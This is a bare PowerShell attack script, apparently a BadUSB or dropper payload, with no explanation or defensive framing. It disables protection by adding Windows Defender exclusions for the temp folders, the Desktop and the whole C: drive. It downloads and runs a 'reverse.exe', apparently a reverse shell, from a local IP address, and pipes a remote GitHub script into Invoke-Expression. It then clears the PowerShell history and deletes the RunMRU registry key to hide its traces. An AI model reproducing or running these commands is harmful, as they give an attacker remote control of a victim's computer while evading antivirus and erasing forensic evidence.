    Set-ExecutionPolicy unrestricted -Force; 
    
    Add-MpPreference -ExclusionPath "$env:USERPROFILE\Desktop\" ; Add-MpPreference -ExclusionPath "$env:TEMP" ; Add-MpPreference -ExclusionPath "$env:temp/" ; Add-MpPreference -ExclusionPath "C:\Temp" ; Add-MpPreference -ExclusionPath "C:" ; Invoke-WebRequest -Uri "http://192.168.1.143/reverse.exe" -OutFile "$env:temp\rs.exe"; powershell "$env:temp\rs.exe";
    irm https://raw.githubusercontent.com/Chapelo/rs/main/rs3.ps1 | iex;
    [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory();
    # Limpiar ejecucion de powershell
    Remove-Item HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU;
    

